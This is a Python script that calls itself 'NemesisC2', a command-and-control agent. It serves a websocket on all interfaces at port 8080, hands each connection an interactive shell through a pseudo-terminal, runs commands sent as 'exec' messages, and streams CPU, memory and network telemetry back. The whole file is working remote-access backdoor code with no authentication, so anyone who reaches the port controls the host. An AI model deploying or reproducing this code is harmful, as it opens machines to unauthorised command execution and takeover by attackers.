import asyncio
import json
import os
import pty
import fcntl
import struct
import termios
import psutil
import websockets
import threading

class NemesisC2:
    def __init__(self):
        self.master_fd = None

    def resize_terminal(self, rows, cols):
        if self.master_fd:
            winsize = struct.pack("HHHH", rows, cols, 0, 0)
            fcntl.ioctl(self.master_fd, termios.TIOCSWINSZ, winsize)

    async def telemetry_loop(self, websocket):
        """Sends CPU/RAM/NET stats every 2 seconds"""
        while True:
            try:
                stats = {
                    'type': 'telemetry',
                    'cpu': psutil.cpu_percent(),
                    'ram': psutil.virtual_memory().percent,
                    'net_sent': psutil.net_io_counters().bytes_sent,
                    'net_recv': psutil.net_io_counters().bytes_recv
                }
                await websocket.send(json.dumps(stats))
                await asyncio.sleep(2)
            except:
                break

    async def terminal_handler(self, websocket):
        """Handles PTY (Pseudo-Terminal) interactions"""
        # Create a new PTY
        pid, fd = pty.fork()
        
        if pid == 0:  # Child process
            # Start bash or zsh
            shell = os.environ.get('SHELL', 'bash')
            os.execl(shell, shell)
        else:  # Parent process
            self.master_fd = fd
            
            # Start telemetry in background
            asyncio.create_task(self.telemetry_loop(websocket))

            # Loop to read from PTY and send to WebSocket
            loop = asyncio.get_event_loop()
            
            # PTY Reader
            def read_from_pty():
                while True:
                    try:
                        data = os.read(self.master_fd, 4096)
                        if data:
                            asyncio.run_coroutine_threadsafe(
                                websocket.send(json.dumps({'type': 'output', 'data': data.decode(errors='ignore')})), 
                                loop
                            )
                    except OSError:
                        break
            
            # Run PTY reader in a separate thread to not block asyncio
            threading.Thread(target=read_from_pty, daemon=True).start()

            # Input Listener
            try:
                async for message in websocket:
                    payload = json.loads(message)
                    if payload['type'] == 'input':
                        os.write(self.master_fd, payload['data'].encode())
                    elif payload['type'] == 'resize':
                        self.resize_terminal(payload['rows'], payload['cols'])
                    elif payload['type'] == 'exec':
                        cmd = payload['cmd'] + '\n'
                        os.write(self.master_fd, cmd.encode())
            except:
                pass

async def main():
    agent = NemesisC2()
    print("\033[1;32m[NEMESIS-C2] SERVER ONLINE ON PORT 8080\033[0m")
    async with websockets.serve(agent.terminal_handler, "0.0.0.0", 8080):
        await asyncio.Future()

if __name__ == "__main__":
    asyncio.run(main())
